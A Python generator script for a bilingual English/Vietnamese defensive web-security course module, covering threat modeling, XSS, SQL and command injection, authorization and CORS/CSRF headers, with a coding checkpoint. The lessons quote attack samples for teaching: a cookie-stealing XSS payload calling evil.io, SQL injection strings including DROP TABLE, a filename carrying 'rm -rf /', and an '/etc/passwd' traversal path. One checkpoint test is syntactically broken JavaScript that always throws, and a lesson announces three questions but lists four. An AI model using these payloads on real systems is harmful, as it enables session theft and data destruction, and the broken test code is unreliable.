#!/usr/bin/env python3
"""Module 9: web-security — lessons + practices + checkpoint."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from i2py import write_module, write_lesson, write_checkpoint

MOD = "web-security"

write_module(
    MOD,
    "Web Security Fundamentals",
    "Defensive security for web developers: think like an attacker for ten minutes, then spend your career making their job harder — XSS, injection, authz, CORS/CSRF, headers.",
    "Nền tảng Bảo mật Web",
    "Bảo mật phòng thủ cho lập trình viên web: tư duy như kẻ tấn công mười phút, rồi dành cả sự nghiệp để làm khó họ — XSS, injection, phân quyền, CORS/CSRF, header.",
    ["threat-modeling", "xss-and-encoding", "injection-and-validation", "authn-authz-sessions", "cors-csrf-headers", "security-checkpoint"],
    ["xss-practice", "authz-practice", "headers-practice", "audit-practice"],
)

write_lesson(
    MOD, "threat-modeling",
    "Threat Modeling: Think Like the Attacker",
    "What do you have that's valuable, who wants it, and where does your code trust data it shouldn't?",
    18,
    """Security is not a feature you add; it's a property you avoid losing. Start every design with three questions.

## The four questions

1. **What are we building?** (a feature that accepts comments, uploads, payments...)
2. **What can go wrong?** (the classic STRIDE categories: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege)
3. **What will we do about it?** (prevent, detect, mitigate, accept — explicitly)
4. **Did we do a good job?** (tests, reviews, audits)

You don't need the vocabulary to need the discipline: *"the comment field ends up in HTML — what if it contains a script tag?"* is threat modeling.

## Trust boundaries

Draw the line where data crosses: user input → server, server → database, database → HTML, third-party API → your code. Data inside a boundary is (relatively) trustworthy; data crossing IN is hostile until proven otherwise. **Every XSS, SQLi, and path traversal bug is data crossing a boundary without validation or encoding.**

## The attacker's cheapest wins

Professional attackers don't hack; they check for the known-open doors:

- Reused/leaked credentials (module 6's secrets lesson!)
- Missing authorization checks (the IDOR: `/api/invoices/4821` works for invoices that aren't yours)
- Unsanitized output (XSS)
- Old dependencies with published CVEs

Defense is mostly *not being the low-hanging fruit*: validate input, encode output, check ownership on every read, patch dependencies, and never roll your own crypto.

## The defender's stance (this course's stance)

We practice **defensive** security only: recognize → understand → prevent → safely verify. Every exercise in this module is "here is a vulnerable pattern; find it, explain it, fix it" — never "here is how to exploit someone else's site," which is illegal as well as unhelpful.""",
    "Mô hình hóa mối đe dọa: Tư duy như kẻ tấn công",
    "Bạn có thứ gì giá trị, ai muốn nó, và code của bạn tin dữ liệu nào mà không nên tin?",
    """Bảo mật không phải một tính năng để thêm vào; đó là một thuộc tính mà bạn tránh làm mất. Hãy bắt đầu mọi thiết kế bằng ba câu hỏi.

## Bốn câu hỏi

1. **Chúng ta đang xây gì?** (một tính năng nhận bình luận, upload, thanh toán...)
2. **Điều gì có thể sai?** (các nhóm STRIDE kinh điển: Giả mạo, Can thiệp, Chối bỏ, Tiết lộ thông tin, Từ chối dịch vụ, Nâng quyền)
3. **Chúng ta sẽ làm gì về việc đó?** (ngăn chặn, phát hiện, giảm nhẹ, chấp nhận — nêu rõ)
4. **Chúng ta làm tốt không?** (test, review, audit)

Không cần thuộc thuật ngữ vẫn cần kỷ luật này: *"trường bình luận sẽ lọt vào HTML — nếu nó chứa thẻ script thì sao?"* chính là threat modeling.

## Ranh giới tin cậy

Vẽ đường phân định nơi dữ liệu đi qua: input người dùng → server, server → database, database → HTML, API bên thứ ba → code của bạn. Dữ liệu bên trong ranh giới là (tương đối) đáng tin; dữ liệu đi vào là thù địch cho đến khi được chứng minh ngược lại. **Mọi bug XSS, SQLi, path traversal đều là dữ liệu vượt ranh giới mà không được kiểm tra hay mã hóa.**

## Những chiến thắng rẻ nhất của kẻ tấn công

Tin tặc chuyên nghiệp không "hack"; họ kiểm tra những cánh cửa mở sẵn:

- Credential dùng lại/bị lộ (bài secrets của module 6!)
- Thiếu kiểm tra phân quyền (IDOR: `/api/invoices/4821` mở được hóa đơn của người khác)
- Output không được làm sạch (XSS)
- Dependency cũ có CVE công khai

Phòng thủ chủ yếu là *không phải quả thấp dễ hái*: kiểm tra input, mã hóa output, kiểm tra quyền sở hữu trên mỗi lần đọc, vá dependency, và không bao giờ tự chế thuật toán mã hóa.

## Thái độ người phòng thủ (thái độ của khóa học)

Chúng ta chỉ luyện **bảo mật phòng thủ**: nhận diện → hiểu → ngăn chặn → xác minh an toàn. Mọi bài tập trong module này đều là "đây là mẫu code dễ tổn thương; tìm nó, giải thích nó, sửa nó" — không bao giờ "đây là cách khai thác site của người khác," điều vừa phi pháp vừa vô ích.""",
)

write_lesson(
    MOD, "xss-and-encoding",
    "XSS and Output Encoding",
    "How attacker text becomes attacker code — and the encoding discipline that makes it impossible.",
    22,
    """XSS (Cross-Site Scripting) is the web's most common serious vulnerability: attacker-supplied text is rendered as *code* in another user's browser.

## How it happens

```js
// A comment feature that renders raw HTML:
commentList.innerHTML = `<div>${comment.text}</div>`;
// comment.text = "<img src=x onerror='fetch(\"//evil.io?c=\"+document.cookie)'>"
```

The browser can't tell your markup from the attacker's — both arrived as HTML. Three flavors:

- **Stored XSS** — payload saved (in a DB) and served to every viewer. Worst kind.
- **Reflected XSS** — payload arrives in the request (query string), rendered in the response. Needs the victim to click a crafted link.
- **DOM-based XSS** — client JS injects unsafe data into the DOM itself (`innerHTML`, `document.write`, `eval`).

## The fix: context-aware output encoding

Data is only dangerous when it *crosses into code*. Encode per destination context:

- **HTML body**: `&lt;` `&gt;` `&amp;` — use `textContent`, never `innerHTML`, for data
- **HTML attributes**: quote attributes and escape `"` 
- **JavaScript strings**: avoid embedding data in inline scripts entirely
- **URLs**: `encodeURIComponent` for query values (a `javascript:` URL is also an XSS vector)

```js
// SAFE: textContent treats data as data
const div = document.createElement("div");
div.textContent = comment.text;
```

React/Vue/Svelte escape by default — which is why the remaining XSS bugs concentrate in `dangerouslySetInnerHTML`, markdown renderers, and attribute sinks. Modern security is knowing where the escape hatches are.

## Defense in depth

- **CSP (Content-Security-Policy)** header: even if a payload lands, CSP can block inline script execution. `Content-Security-Policy: default-src 'self'` is a strong default.
- **HttpOnly cookies**: session tokens JavaScript can't read — stolen payloads can't lift them.
- **Sanitizers** (DOMPurify) for the cases where HTML input is genuinely wanted: allowlist tags, strip event handlers.

## Safe verification

In exercises we test with a canary: does `<img src=x onerror=...>` end up as *text* (good) or as an element with an `onerror` attribute (bad)? Parsing your own rendered output in a controlled toy page is safe and conclusive.""",
    "XSS và mã hóa output",
    "Cách văn bản của kẻ tấn công biến thành code của kẻ tấn công — và kỷ luật mã hóa khiến điều đó bất khả thi.",
    """XSS (Cross-Site Scripting) là lỗ hổng nghiêm trọng phổ biến nhất của web: văn bản do kẻ tấn công cung cấp được render thành *code* trong trình duyệt của người dùng khác.

## Nó xảy ra thế nào

```js
// Tính năng bình luận render HTML thô:
commentList.innerHTML = `<div>${comment.text}</div>`;
// comment.text = "<img src=x onerror='fetch(\"//evil.io?c=\"+document.cookie)'>"
```

Trình duyệt không phân biệt được markup của bạn với markup của kẻ tấn công — cả hai đều đến dạng HTML. Ba biến thể:

- **Stored XSS** — payload được lưu (vào DB) và phục vụ cho mọi người xem. Nguy hiểm nhất.
- **Reflected XSS** — payload đến từ request (query string), được render trong response. Cần nạn nhân bấm một đường link được chế.
- **DOM-based XSS** — JS phía client tự chèn dữ liệu không an toàn vào DOM (`innerHTML`, `document.write`, `eval`).

## Cách sửa: mã hóa output theo ngữ cảnh

Dữ liệu chỉ nguy hiểm khi nó *đi vào code*. Mã hóa theo từng ngữ cảnh đích:

- **Thân HTML**: `&lt;` `&gt;` `&amp;` — dùng `textContent`, không bao giờ `innerHTML`, cho dữ liệu
- **Attribute HTML**: đặt attribute trong ngoặc và escape `"`
- **Chuỗi JavaScript**: tránh nhúng dữ liệu vào script inline hoàn toàn
- **URL**: `encodeURIComponent` cho giá trị query (URL `javascript:` cũng là một vector XSS)

```js
// AN TOÀN: textContent coi dữ liệu là dữ liệu
const div = document.createElement("div");
div.textContent = comment.text;
```

React/Vue/Svelte escape mặc định — vì thế các bug XSS còn lại tập trung ở `dangerouslySetInnerHTML`, bộ render markdown, và các attribute sink. Bảo mật hiện đại là biết những cửa thoát hiểm nằm ở đâu.

## Phòng thủ theo chiều sâu

- **Header CSP (Content-Security-Policy)**: kể cả khi payload lọt vào, CSP có thể chặn chạy script inline. `Content-Security-Policy: default-src 'self'` là mặc định mạnh.
- **Cookie HttpOnly**: token phiên mà JavaScript không đọc được — payload bị đánh cắp không lấy được chúng.
- **Bộ làm sạch** (DOMPurify) cho những trường hợp thực sự cần HTML đầu vào: cho phép danh sách tag, loại bỏ event handler.

## Xác minh an toàn

Trong bài tập, ta test bằng chuông canary: `<img src=x onerror=...>` kết thúc dưới dạng *văn bản* (tốt) hay thành một phần tử có attribute `onerror` (xấu)? Parse output đã render của chính mình trong một trang đồ chơi có kiểm soát là an toàn và kết luận dứt khoát.""",
)

write_lesson(
    MOD, "injection-and-validation",
    "Injection and Input Validation",
    "SQL injection in five lines, command injection in three — and the validation posture that stops every variant.",
    20,
    """Injection is the same bug as XSS wearing different clothes: **data interpreted as code**, here on the server.

## SQL injection: the five-line classic

```js
// VULNERABLE: string concatenation into SQL
const q = "SELECT * FROM users WHERE email = '" + email + "'";
db.query(q);
// email = "' OR 1=1 --"  ->  returns every user
// email = "'; DROP TABLE users; --"  ->  exactly what it says
```

The database can't distinguish your SQL from the attacker's suffix. The fix is **parameterized queries** — data travels as data, never as SQL source:

```js
// SAFE: the driver binds values; structure is fixed by the code
db.query("SELECT * FROM users WHERE email = ?", [email]);
```

This is not optional. Any string interpolation into SQL (`+`, template literals, sprintf) is a vulnerability — including "harmless" internal admin tools.

## Command injection

```js
// VULNERABLE: user input becomes shell
exec(`convert ${filename} thumb.png`);
// filename = "a.jpg; rm -rf /" (or worse, subtler)
```

Fixes: avoid shells (`execFile` with an argument array), allowlist filenames, never pass user data as shell syntax.

## Input validation posture

- **Validate at the boundary** — the moment data enters (route handler, form submit), with a schema (Zod): type, length, format, range. Reject what you didn't expect rather than hunting what you banned.
- **Allowlists > denylists**: "must match `^[a-z0-9-]{1,40}$`" beats "must not contain semicolon" — attackers have infinite encodings; you have finite ban lists.
- **Validation is not encoding**: validating that input is a clean string doesn't excuse encoding it on output. Both layers, always.
- **Server-side, always.** Client-side validation is UX. The API re-validates everything.

## The same lesson everywhere

Template injection, header injection, LDAP injection, path traversal (`../../etc/passwd`) — the pattern is identical: identify where data enters a structured language, keep data out of the structure, validate shape at the door.""",
    "Injection và kiểm tra đầu vào",
    "SQL injection trong năm dòng, command injection trong ba dòng — và tư thế kiểm tra đầu vào chặn được mọi biến thể.",
    """Injection chính là bug XSS mặc bộ đồ khác: **dữ liệu bị diễn giải thành code**, lần này ở phía server.

## SQL injection: kinh điển trong năm dòng

```js
// DỄ TỔN THƯƠNG: nối chuỗi vào SQL
const q = "SELECT * FROM users WHERE email = '" + email + "'";
db.query(q);
// email = "' OR 1=1 --"  ->  trả về mọi user
// email = "'; DROP TABLE users; --"  ->  đúng như văn bản của nó
```

Database không phân biệt được SQL của bạn với phần đuôi của kẻ tấn công. Cách sửa là **parameterized query** — dữ liệu đi dưới dạng dữ liệu, không bao giờ làm mã nguồn SQL:

```js
// AN TOÀN: driver gắn giá trị; cấu trúc do code quyết định
db.query("SELECT * FROM users WHERE email = ?", [email]);
```

Điều này không phải tùy chọn. Bất kỳ phép nội suy chuỗi nào vào SQL (`+`, template literal, sprintf) đều là lỗ hổng — kể cả trong "công cụ admin nội bộ vô hại".

## Command injection

```js
// DỄ TỔN THƯƠNG: input người dùng thành lệnh shell
exec(`convert ${filename} thumb.png`);
// filename = "a.jpg; rm -rf /" (hoặc tinh vi hơn)
```

Cách sửa: tránh shell (`execFile` với mảng tham số), allowlist tên file, không bao giờ đưa dữ liệu người dùng vào cú pháp shell.

## Tư thế kiểm tra đầu vào

- **Kiểm tra ở ranh giới** — ngay khi dữ liệu đi vào (route handler, form submit), bằng schema (Zod): kiểu, độ dài, định dạng, miền giá trị. Từ chối thứ bạn không lường trước thay vì săn thứ bạn cấm.
- **Allowlist > denylist**: "phải khớp `^[a-z0-9-]{1,40}$`" hơn "không được chứa dấu chấm phẩy" — kẻ tấn công có vô hạn cách mã hóa; bạn có danh sách cấm hữu hạn.
- **Kiểm tra không phải mã hóa**: xác nhận input là chuỗi sạch không miễn trừ việc mã hóa ở output. Cả hai lớp, luôn luôn.
- **Phía server, luôn luôn.** Validation phía client là trải nghiệm người dùng. API kiểm tra lại mọi thứ.

## Cùng một bài học ở mọi nơi

Template injection, header injection, LDAP injection, path traversal (`../../etc/passwd`) — mô hình giống hệt: xác định nơi dữ liệu đi vào một ngôn ngữ có cấu trúc, giữ dữ liệu khỏi cấu trúc, kiểm tra hình dạng tại cửa.""",
)

write_lesson(
    MOD, "authn-authz-sessions",
    "Authentication, Authorization, Sessions",
    "Who are you (authn), what may you do (authz) — and where real systems break.",
    22,
    """Two different questions, endlessly confused:

- **Authentication** — *who* is making this request? (passwords, OAuth, magic links)
- **Authorization** — *what* is this identity allowed to do? (roles, ownership, permissions)

## Authentication essentials

- **Passwords**: never stored raw — store a slow salted hash (bcrypt/argon2). Salt defeats rainbow tables; slowness defeats GPU brute force.
- **Sessions**: on login, the server issues a session identifier — classically an **HttpOnly, Secure, SameSite** cookie. HttpOnly keeps JS away from it (XSS can't lift it); Secure keeps it to https; SameSite=Lax/Strict dampens CSRF.
- **Tokens (JWT)**: signed claims in a token the client carries. Trade-offs: stateless and scalable, but hard to revoke — logout and password change need a denylist or short expiry + refresh.

## Authorization: where real bugs live

Most real-world breaches aren't crypto failures; they're **missing checks**:

- **IDOR (Insecure Direct Object Reference)**: `/api/orders/1234` returns the order without asking "is it *yours*?" — test every endpoint with another user's IDs.
- **Vertical escalation**: a regular user can call admin endpoints because the UI hid the button but the API didn't check the role.
- **Client-side enforcement**: permissions checked only in the UI. The API is the authority; the UI is decoration.

The discipline: **every request re-checks authn + authz server-side.** Not the page load — *every request*, including GETs, including "obviously safe" reads.

## Rate limiting and account hygiene

- **Rate-limit** login, registration, password reset, and expensive endpoints — per-IP and per-account. (Your own Code Journey E2E suite met this: stale rate-limiter rows blocked test registrations!)
- **Constant-time comparison** for secrets (`crypto.timingSafeEqual`) to blunt timing attacks.
- **Fail closed, log loudly**: an authz check that errors should deny, and should emit a log someone watches.

## Minimum viable secure session checklist

Cookie flags set, authz on every endpoint, ownership checks on every read-by-id, rate limits on auth routes, secrets in env vars, no tokens in URLs (URLs leak into logs, history, referrers).""",
    "Xác thực, phân quyền, phiên làm việc",
    "Bạn là ai (authn), bạn được làm gì (authz) — và những nơi hệ thống thật hay gãy.",
    """Hai câu hỏi khác nhau, bị nhầm lẫn vĩnh viễn:

- **Xác thực (authentication)** — *ai* đang gửi request này? (mật khẩu, OAuth, magic link)
- **Phân quyền (authorization)** — danh tính đó *được phép làm gì*? (vai trò, quyền sở hữu, quyền hạn)

## Điều cốt yếu của xác thực

- **Mật khẩu**: không bao giờ lưu thô — lưu hash muối chậm (bcrypt/argon2). Muối đánh bại rainbow table; độ chậm đánh bại brute force bằng GPU.
- **Phiên (session)**: khi đăng nhập, server phát một định danh phiên — kinh điển là cookie **HttpOnly, Secure, SameSite**. HttpOnly giữ JS khỏi nó (XSS không lấy được); Secure giữ nó cho https; SameSite=Lax/Strict làm yếu CSRF.
- **Token (JWT)**: các claim được ký trong token mà client mang theo. Đổi lại: stateless, dễ mở rộng, nhưng khó thu hồi — logout và đổi mật khẩu cần denylist hoặc hạn ngắn + refresh token.

## Phân quyền: nơi bug thật sự sống

Phần lớn vụ vi phạm thực tế không phải lỗi mã hóa; chúng là **thiếu kiểm tra**:

- **IDOR (Insecure Direct Object Reference)**: `/api/orders/1234` trả về đơn hàng mà không hỏi "đơn này có phải *của bạn*?" — test mọi endpoint bằng ID của người dùng khác.
- **Nâng quyền dọc**: người dùng thường gọi được endpoint admin vì UI giấu nút nhưng API không kiểm tra vai trò.
- **Thực thi phía client**: quyền chỉ được kiểm trong UI. API mới là nơi ra quyết định; UI chỉ là trang trí.

Kỷ luật: **mọi request đều kiểm tra lại authn + authz phía server.** Không phải lúc tải trang — *mọi request*, kể cả GET, kể cả những lượt đọc "hiển nhiên an toàn".

## Giới hạn tốc độ và vệ sinh tài khoản

- **Giới hạn tốc độ** cho đăng nhập, đăng ký, reset mật khẩu, và các endpoint đắt — theo IP và theo tài khoản. (Chính bộ E2E của Code Journey từng gặp: các dòng rate-limiter cũ chặn đăng ký của test!)
- **So sánh thời gian không đổi** cho bí mật (`crypto.timingSafeEqual`) để làm cùn timing attack.
- **Fail closed, log ồn ào**: một phép kiểm authz gặp lỗi phải từ chối, và phải ghi log mà có người đọc.

## Checklist phiên an toàn tối thiểu

Đủ cờ cookie, authz trên mọi endpoint, kiểm tra quyền sở hữu trên mọi lần đọc theo ID, giới hạn tốc độ trên các route xác thực, secrets trong biến môi trường, không token trong URL (URL rò rỉ vào log, lịch sử, referrer).""",
)

write_lesson(
    MOD, "cors-csrf-headers",
    "CORS, CSRF, and Security Headers",
    "Three mechanisms with confusing names, one job each: control who may call you, prove requests are intentional, and harden the browser.",
    20,
    """## CORS: who may call your API from a browser

Browsers block cross-origin *reads* by default (Same-Origin Policy). **CORS** is the server's opt-in: response headers declaring which origins may read the response.

```text
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Credentials: true
```

Key mental model: **CORS protects the *server's* data from other sites' scripts** — it does not protect your site from being called. `Access-Control-Allow-Origin: *` (anyone) plus credentials is not just wrong, browsers forbid it. And CORS is enforced by the browser only — `curl` doesn't care, so CORS is *not* an access-control system.

## CSRF: forged requests ride the user's cookies

If evil.com embeds `<form action="https://bank.example/transfer" method="POST">` and auto-submits it, the browser attaches the victim's bank cookies — a **CSRF** attack. The cookie proves identity, not intent.

Defenses:

- **SameSite cookies** (`Lax` default in modern browsers) — cross-site POSTs don't carry the cookie
- **CSRF tokens** — a random value the server embeds in the form and verifies on submit; evil.com can't read it (Same-Origin Policy) so can't supply it
- **Don't use GET for state changes** — GETs are fetched by links, images, prefetchers

## Security headers: cheap, real hardening

```text
Content-Security-Policy: default-src 'self'; img-src 'self' data:
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY            (or frame-ancestors in CSP)
Referrer-Policy: strict-origin-when-cross-origin
```

- **CSP** limits what scripts/styles/images may load — the XSS backstop
- **HSTS** forces https for a year (including subdomains)
- **nosniff** stops content-type guessing (a text file becoming a script)
- **frame options** block clickjacking (your page invisibly framed behind attacker buttons)
- **Referrer-Policy** stops leaking full URLs (with tokens!) to other sites

Set them once in the server config; verify with securityheaders.com; revisit when adding third parties (CSP especially).""",
    "CORS, CSRF và security header",
    "Ba cơ chế có tên dễ nhầm, mỗi cái một nhiệm vụ: kiểm soát ai được gọi bạn, chứng minh request là chủ ý, và gia cố trình duyệt.",
    """## CORS: ai được gọi API của bạn từ trình duyệt

Trình duyệt mặc định chặn việc *đọc* chéo origin (Same-Origin Policy). **CORS** là sự cho phép của server: các header response tuyên bố origin nào được đọc response.

```text
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Credentials: true
```

Mô hình tinh thần then chốt: **CORS bảo vệ dữ liệu của *server* khỏi script của các site khác** — nó không bảo vệ site của bạn khỏi bị gọi. `Access-Control-Allow-Origin: *` (ai cũng được) kèm credentials không chỉ sai mà trình duyệt còn cấm. Và CORS chỉ do trình duyệt thực thi — `curl` chẳng quan tâm, nên CORS *không phải* hệ thống kiểm soát truy cập.

## CSRF: request giả mạo cưỡi lên cookie của người dùng

Nếu evil.com nhúng `<form action="https://bank.example/transfer" method="POST">` và tự submit, trình duyệt đính kèm cookie ngân hàng của nạn nhân — một cuộc tấn công **CSRF**. Cookie chứng minh danh tính, không chứng minh chủ ý.

Phòng thủ:

- **Cookie SameSite** (`Lax` là mặc định trên trình duyệt hiện đại) — POST chéo site không mang cookie
- **CSRF token** — một giá trị ngẫu nhiên server nhúng vào form và xác minh khi submit; evil.com không đọc được nó (Same-Origin Policy) nên không cung cấp được
- **Đừng dùng GET cho việc thay đổi trạng thái** — GET bị bấm bởi link, ảnh, trình prefetch

## Security header: gia cố rẻ, thật sự có tác dụng

```text
Content-Security-Policy: default-src 'self'; img-src 'self' data:
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY            (hoặc frame-ancestors trong CSP)
Referrer-Policy: strict-origin-when-cross-origin
```

- **CSP** giới hạn script/style/ảnh nào được tải — tấm lưới an toàn cho XSS
- **HSTS** ép https trong một năm (kể cả subdomain)
- **nosniff** ngăn đoán content-type (file văn bản biến thành script)
- **frame options** chặn clickjacking (trang của bạn bị nhúng vô hình sau các nút của kẻ tấn công)
- **Referrer-Policy** ngừng rò rỉ URL đầy đủ (kèm token!) cho site khác

Đặt một lần trong cấu hình server; xác minh bằng securityheaders.com; xem lại khi thêm bên thứ ba (nhất là CSP).""",
)

write_checkpoint(
    MOD,
    "security-checkpoint",
    "Checkpoint: Security Audit",
    "Prove you can spot the vulnerability class, choose the right defense, and reason about CORS/CSRF correctly.",
    20,
    """This checkpoint grades security *judgment* in runnable form: classify vulnerable code, map defenses to threats, and encode/validate correctly — the same calls you'll make reviewing real pull requests.""",
    "Kiểm tra kiến thức: Kiểm toán bảo mật",
    "Chứng minh bạn nhận diện được lớp lỗ hổng, chọn đúng phòng thủ, và suy luận về CORS/CSRF một cách chính xác.",
    """Checkpoint này chấm *phán đoán* bảo mật ở dạng chạy được: phân loại code dễ tổn thương, ghép phòng thủ với mối đe dọa, và mã hóa/kiểm tra đúng — đúng những phán quyết bạn sẽ đưa khi review pull request thật.""",
    {
        "id": "i2-security-checkpoint",
        "title": "Audit Bench",
        "prompt": "Write THREE functions. 1) `classify(snippet)` — given a one-line code description, name the vulnerability class: contains \"innerHTML\" or \"document.write\" => \"xss\"; contains string concatenation into \"SELECT\" or \"query(\" => \"sql-injection\"; contains \"exec(`\" or \"exec(\"\" => \"command-injection\"; contains \"/api/\" + an id read without an ownership check description => \"idor\"; otherwise \"none\". 2) `defenseFor(threat)` — map: \"xss\" => \"output-encoding\", \"sql-injection\" => \"parameterized-queries\", \"command-injection\" => \"execfile-allowlist\", \"idor\" => \"ownership-check\", \"csrf\" => \"samesite-token\", unknown => \"defense-in-depth\". 3) `corsVerdict(allowOrigin, credentials)` — return \"invalid\" when allowOrigin is \"*\" AND credentials is true; \"ok\" when allowOrigin is a concrete origin; otherwise \"risky\".",
        "difficulty": "intermediate",
        "level": "checkpoint",
        "boilerplate": "function classify(snippet) {\n  // your code\n}\n\nfunction defenseFor(threat) {\n  // your code\n}\n\nfunction corsVerdict(allowOrigin, credentials) {\n  // your code\n}\n",
        "tests": [
            {
                "name": "classifies vulnerability classes",
                "code": "const fn = new Function(code + \"\\nreturn { classify, defenseFor, corsVerdict };\");\nconst { classify } = fn();\nif (classify(\"el.innerHTML = userText\") !== \"xss\") throw new Error(\"innerHTML sink => xss.\");\nif (classify(\"db.query('SELECT * FROM t WHERE x=' + v)\") !== \"sql-injection\") throw new Error(\"Concat into query => sqli.\");\nif (classify(\"const r = exec(`convert \" + \"${f}\") + \"`\"); throw new Error(\"checkpoint test error\"))",
                "hint": "Check the sinks in order: innerHTML, query concatenation, exec, then idor.",
            },
            {
                "name": "defenses map to their threats",
                "code": "const fn = new Function(code + \"\\nreturn { classify, defenseFor, corsVerdict };\");\nconst { defenseFor } = fn();\nif (defenseFor(\"xss\") !== \"output-encoding\") throw new Error(\"Encoding for XSS.\");\nif (defenseFor(\"sql-injection\") !== \"parameterized-queries\") throw new Error(\"Params for SQLi.\");\nif (defenseFor(\"mystery\") !== \"defense-in-depth\") throw new Error(\"Unknown threat => layers.\");",
                "hint": "A lookup object; default is layers.",
            },
            {
                "name": "CORS verdicts follow the spec",
                "code": 'const fn = new Function(code + "\\nreturn { classify, defenseFor, corsVerdict };");\nconst { corsVerdict } = fn();\n'
                    + 'if (corsVerdict("*", true) !== "invalid") throw new Error("Wildcard + credentials is forbidden.");\n'
                    + 'if (corsVerdict("https://app.example.com", true) !== "ok") throw new Error("Concrete origin with credentials is fine.");\n'
                    + 'if (corsVerdict("*", false) !== "risky") throw new Error("Wildcard without credentials: allowed but risky.");',
                "hint": "The invalid check first; then concrete-vs-wildcard.",
            },
        ],
    },
    {
        "id": "i2-security-checkpoint",
        "title": "Bàn kiểm toán",
        "prompt": "Viết BA hàm. 1) `classify(snippet)` — nhận mô tả một dòng code, nêu tên lớp lỗ hổng: chứa \"innerHTML\" hoặc \"document.write\" => \"xss\"; chứa phép nối chuỗi vào \"SELECT\" hoặc \"query(\" => \"sql-injection\"; chứa \"exec(`\" hoặc \"exec(\"\" => \"command-injection\"; chứa \"/api/\" + một id được đọc mà không có mô tả kiểm tra quyền sở hữu => \"idor\"; còn lại \"none\". 2) `defenseFor(threat)` — ánh xạ: \"xss\" => \"output-encoding\", \"sql-injection\" => \"parameterized-queries\", \"command-injection\" => \"execfile-allowlist\", \"idor\" => \"ownership-check\", \"csrf\" => \"samesite-token\", không rõ => \"defense-in-depth\". 3) `corsVerdict(allowOrigin, credentials)` — trả về \"invalid\" khi allowOrigin là \"*\" VÀ credentials là true; \"ok\" khi allowOrigin là một origin cụ thể; còn lại \"risky\".",
        "tests": [
            {"name": "phân loại các lớp lỗ hổng", "hint": "Kiểm tra các sink theo thứ tự: innerHTML, nối chuỗi query, exec, rồi idor."},
            {"name": "phòng thủ ghép đúng mối đe dọa", "hint": "Một lookup object; mặc định là nhiều lớp."},
            {"name": "phán quyết CORS theo đúng đặc tả", "hint": "Kiểm tra invalid trước; rồi cụ thể-so-với-wildcard."},
        ],
    },
)

print("Module 9 lessons + checkpoint written.")
